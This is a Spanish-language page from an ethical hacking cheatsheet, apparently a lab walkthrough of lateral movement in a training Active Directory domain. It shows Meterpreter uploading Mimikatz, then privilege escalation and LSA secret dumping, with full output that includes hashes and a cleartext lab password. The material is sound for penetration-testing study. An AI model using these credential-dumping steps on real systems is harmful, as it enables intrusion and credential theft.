
# Movimiento lateral

### <mark style="color:purple;">Esquema de pivoting</mark> <a href="#esquema-de-pivoting" id="esquema-de-pivoting"></a>

Tenemos el siguiente esquema de red que podemos usar para tener claro la visión de la red:

{% hint style="warning" %}
Hacer diagrama con FossFlow del estado actual de la red
{% endhint %}

<figure><img src="https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252F0vozQumCLSRvJUwtovx2%252Fimage.png%3Falt%3Dmedia%26token%3D74469ba4-79e8-4e6e-a40d-241e59e4ab53&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=79858c58&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Después de lootear el host `DEV01`, encontramos el siguiente conjunto de credenciales al volcar los LSA Secrets:

```
hporter:Gr8hambino!
```

#### Método alternativo para conseguir credenciales <a href="#metodo-alternativo-para-conseguir-credenciales" id="metodo-alternativo-para-conseguir-credenciales"></a>

Si no hubiéramos conseguido por lo que sea las credenciales de `hporter` podríamos haber enumerado el usuario igualmente desde la sesión de Meterpreter:

```powershell
PS C:\users> ls

    Directory: C:\users

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----         6/1/2022  12:03 PM                .NET v2.0                                                             
d-----         6/1/2022  12:03 PM                .NET v2.0 Classic                                                     
d-----         6/1/2022  12:03 PM                .NET v4.5                                                             
d-----         6/1/2022  12:03 PM                .NET v4.5 Classic                                                     
d-----         6/1/2022   1:03 PM                Administrator                                                         
d-----         6/1/2022  12:03 PM                Classic .NET AppPool                                                  
d-----         6/1/2022  11:28 PM                hporter                                                               
d-----         6/1/2022  12:54 PM                mpalledorous                                                          
d-r---       12/14/2020   6:30 PM                Public    
```

Y desde aquí cargar Mimikatz para extraer credenciales. Es recomendable usar mi repositorio AD-Tools que contiene todos los binarios necesarios para auditar entornos Active Directory:

{% embed url="<https://github.com/afsh4ck/AD-Tools>" %}

```bash
meterpreter > cd Users\\hporter\\

meterpreter > upload /home/kali/Escritorio/hack-tools/Windows/AD-Tools/mimikatz.exe
[*] Uploading  : /home/kali/Escritorio/hack-tools/Windows/AD-Tools/mimikatz.exe -> mimikatz.exe
[*] Uploaded 1.29 MiB of 1.29 MiB (100.0%): /home/kali/Escritorio/hack-tools/Windows/AD-Tools/mimikatz.exe -> mimikatz.exe
[*] Completed  : /home/kali/Escritorio/hack-tools/Windows/AD-Tools/mimikatz.exe -> mimikatz.exe
```

```powershell
meterpreter > shell
Process 3220 created.
Channel 5 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\Users\hporter>mimikatz.exe
mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

564	{0;000003e7} 1 D 34603     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 0 D 1352266   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,31p)	Primary
 * Thread Token  : {0;000003e7} 1 D 1393202   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)

mimikatz # lsadump::secrets
Domain : ACADEMY-AEN-DEV
SysKey : b3a720652a6fca7e31c1659e3d619944

Local name : ACADEMY-AEN-DEV ( S-1-5-21-4188713075-3040141756-4070027797 )
Domain name : INLANEFREIGHT ( S-1-5-21-2814148634-3729814499-1637837074 )
Domain FQDN : INLANEFREIGHT.LOCAL

Policy subsystem is : 1.18
LSA Key(s) : 1, default {b9789de7-ed68-1526-12f5-08fc1ad2996f}
  [00] {b9789de7-ed68-1526-12f5-08fc1ad2996f} c382f753c97d2798f34aa2c43c41ca6fdc8548a17eba53764e79a20550fed730

Secret  : $MACHINE.ACC
cur/hex : b3 1b 50 8d a2 5a 92 93 0f ae dd ad aa 77 91 46 56 72 4e 8e a2 08 ac 1c eb 3c 69 a0 8c 2b aa d6 a3 4b d4 e4 b2 db 83 db de aa 60 9e a5 92 c9 57 09 6f e5 0a 4a 55 63 47 42 10 f6 9f d7 43 85 92 a7 87 fa 49 d4 03 3f d8 e7 31 e2 8a 9e 5c a5 7c ce dd 9d 9f 64 0d 13 8e 52 b0 9a c1 3a 97 3d d4 d1 92 32 a5 65 6d 4c 6f a5 dd 56 03 d7 04 46 2c c8 a3 0a 27 6c 32 1f e3 fc 62 83 7d ca b9 9f ed c9 12 26 e4 22 45 a6 09 e5 69 9e 5a ed 05 05 04 75 d2 2d c1 1d 20 62 db f9 38 4a cd 10 7f 26 cb b5 3a 43 dc bd 00 11 b6 83 3e 12 bc e8 8a 0f fa 63 b4 5c ed 01 90 62 0f e5 1b dc d9 5d 78 a7 cf 2c ee 53 72 24 d5 ce d9 0a 9f c7 68 5f 37 1e 8e 9c a6 b2 d2 83 21 32 43 23 4d 76 8f 00 11 85 bd 3d 09 e1 39 dd e0 c2 c5 fe a1 be be b8 e5 f2 d9 
    NTLM:9fec886f5c1d994887e6f890e5b91ac4
    SHA1:e8bc7f0d94655e9311d962b04099de186c9090b1
old/text: >& FZ0F!KFq.+MBPHE.l(xyXD;Pay3n*GAY n-9Y;5>w]_KI@QNbWDtk^u@Ia]`ac$f3<a+`93`jbVn>!vJ!4I;!$]Mg!QK.Or)'Lr0Vv'OU;UdaJiu2hT3l
    NTLM:cb8a6327fc3dad4ea7c84b88c7542e7c
    SHA1:7a235e5ec5d545d163d6c181383d3f043d4685c2

Secret  : DefaultPassword
cur/text: Gr8hambino!
```

Dado que tenemos persistencia en `DEV01` podemos usarlo como punto de partida para lanzar nuevos ataques.

Ver la siguiente sección para ideas y técnicas de movimiento lateral:

{% content-ref url="/pages/LvCnvd8B1zZuyziqCjoz" %}
[Movimiento lateral](/ethical-hacking-cheatsheet/hacking-en-entornos-reales/enterprise-hacking/movimiento-lateral-y-escalada-de-privilegios/movimiento-lateral.md)
{% endcontent-ref %}
